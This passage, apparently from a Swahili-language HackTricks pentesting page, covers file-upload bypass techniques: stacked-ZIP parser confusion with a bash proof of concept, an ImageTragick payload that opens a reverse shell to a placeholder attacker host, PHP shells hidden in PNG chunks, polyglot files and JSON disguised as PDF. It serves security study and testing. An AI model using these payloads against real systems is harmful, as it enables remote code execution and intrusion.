- Faili ya payload lazima bado ipite server‑side magic/MIME sniffing. Kuingiza PHP ndani ya PDF stream kunahifadhi header kuwa halali.
- Inafanya kazi pale enum/validation path na extraction/write path zinapokoseana kuhusu jinsi ya kushughulikia string.

### Stacked/concatenated ZIPs (kutokubaliana kwa parser)

Kuunganisha ZIP mbili halali kunaunda blob ambapo parsers tofauti zinaelekeza umakini kwa rekodi tofauti za EOCD. Zana nyingi huzuia End Of Central Directory (EOCD) ya mwisho, wakati baadhi ya maktaba (mfano, ZipArchive katika workflows maalum) zinaweza kuchambua archive ya kwanza wanayopata. Ikiwa validation inaorodhesha archive ya kwanza na extraction inatumia zana nyingine inayoheshimu EOCD ya mwisho, archive isiyo hatari inaweza kupita kwenye ukaguzi wakati ile yenye nia mbaya inachukuliwa nje.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Mfano wa matumizi mabaya
- Tengeneza archive isiyo hatari (aina inayoruhusiwa, kwa mfano PDF) na archive ya pili iliyo na extension iliyozuiliwa (mfano, `shell.php`).
- Waambatanishe: `cat benign.zip evil.zip > combined.zip`.
- Ikiwa seva inathibitisha kwa parser moja (inaona benign.zip) lakini inatoa yaliyomo kwa parser nyingine (inasindika evil.zip), faili iliyozuiliwa itaingia kwenye njia ya uchimbaji.

## ImageTragic

Pakia yaliyomo haya ukiwa na extension ya picha ili kutumia exploit dhidi ya udhaifu **(ImageMagick , 7.0.1-1)** (kutoka kwa [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Kujaza PHP Shell ndani ya PNG

Kujaza PHP shell katika IDAT chunk ya faili ya PNG kunaweza kupitisha baadhi ya operesheni za kushughulikia picha. Funguo za `imagecopyresized` na `imagecopyresampled` kutoka PHP-GD zina umuhimu mkubwa hapa, kwani hutumika kawaida kwa kubadilisha ukubwa na resampling ya picha, mtawaliwa. Uwezo wa PHP shell iliyojazwa kubaki bila kuathiriwa na operesheni hizi ni faida kubwa kwa matumizi fulani.

Uchunguzi wa kina wa mbinu hii, ikiwa ni pamoja na metodologia na matumizi yake yanapatikana katika makala ifuatayo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Rasilimali hii inatoa uelewa mpana wa mchakato na athari zake.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Faili za Polyglot

Faili za polyglot ni zana maalum katika cybersecurity, ambazo zinaweza kuwepo kwa uhalali katika miundo mingi ya faili kwa wakati mmoja. Mfano wa kuvutia ni [GIFAR](https://en.wikipedia.org/wiki/Gifar), mseto unaofanya kazi kama GIF na RAR kwa pamoja. Faili hizi hazibaki kwa mchanganyiko huo tu; mchanganyiko kama GIF na JS au PPT na JS pia yanawezekana.

Faida kuu ya faili za polyglot ni uwezo wao wa kuepuka hatua za usalama zinazokagua faili kwa msingi wa aina. Kwa utekelezaji wa kawaida katika programu mbalimbali, huwaruhusu tu aina fulani za faili kupakiwa—kama JPEG, GIF, au DOC—ili kupunguza hatari inayotokana na miundo hatarishi (mfano, JS, PHP, au Phar). Hata hivyo, polyglot, kwa kufuata vigezo vya kimuundo vya aina nyingi, inaweza kupitisha vikwazo hivi kwa siri.

Licha ya ufanisi wao, polyglots wanakutana na vikwazo. Kwa mfano, ingawa polyglot inaweza kuwa PHAR file na JPEG kwa pamoja, ufanisi wa kupakia huenda ukategemea sera za programu kuhusu extension za faili. Ikiwa mfumo ni mkali kuhusu extension zinazokubaliwa, muumbaji wa polyglot peke yake unaweza kuto kubadilisha matokeo ya kupakiwa.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Kupakia JSON halali kana kwamba ilikuwa PDF

Jinsi ya kuepuka utambuzi wa aina za faili kwa kupakia faili halali ya JSON hata kama haijaruhusiwa kwa kughushi kuwa ni PDF (mbinu kutoka **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Iwapo tu magic bytes `%PDF` ziko katika 1024 byte za mwanzo ni halali (angalia mfano kwenye post)
- **`pdflib` library**: Ongeza format ya PDF bandia ndani ya field ya JSON ili library ithibitishe kuwa ni pdf (angalia mfano kwenye post)
- **`file` binary**: Inaweza kusoma hadi 1048576 bytes kutoka kwa faili. Tengeneza JSON kubwa zaidi ya hiyo ili isiweze kuchambua maudhui kama json kisha ndani ya JSON weka sehemu ya mwanzo ya PDF halisi na itadhani ni PDF

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
